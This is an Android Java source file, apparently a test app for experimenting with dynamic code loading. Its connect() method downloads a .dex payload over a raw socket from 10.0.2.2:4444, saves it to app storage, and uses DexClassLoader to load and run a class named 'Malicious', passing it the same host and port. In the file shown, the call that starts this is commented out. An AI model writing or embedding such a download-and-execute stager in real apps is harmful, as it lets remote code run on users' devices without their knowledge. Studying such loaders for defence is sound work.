package com.example.testapp_android_studio;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.util.Log;

import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;

public class MainActivity extends AppCompatActivity {
    void connect(String host, int port) {
        try {
            java.net.Socket socket = new java.net.Socket(host, port);
            java.io.DataOutputStream out = new java.io.DataOutputStream(socket.getOutputStream());
            java.io.DataInputStream in = new java.io.DataInputStream(socket.getInputStream());
            out.writeUTF("dex");
            out.flush();
            int length = in.readInt();
            byte[] buffer = new byte[length];
            in.readFully(buffer);
            java.io.FileOutputStream fos = openFileOutput("TestClass.dex", MODE_PRIVATE);
            fos.write(buffer);
            fos.close();
            socket.close();
            Log.d("TEST_TAG",getFilesDir().getAbsolutePath() + "/TestClass.dex");
            action(getFilesDir().getAbsolutePath() + "/TestClass.dex", "Malicious", "main");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        nativeFunction();
//        new Thread(() -> connect("10.0.2.2", 4444)).start();
    }

    void action(String path, String claz, String function) {
        try {
            DexClassLoader dexClassLoader = new DexClassLoader(path, getDir("dex", 0).getAbsolutePath(), null, getClassLoader());
            Class<?> clazz = dexClassLoader.loadClass(claz);
            Object instance = clazz.newInstance();
            Method method = clazz.getDeclaredMethod(function, String.class, int.class);
            method.invoke(instance, "10.0.2.2",  4444);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static {
       System.loadLibrary("testapp_android_studio");
    }

    public static native void nativeFunction();
}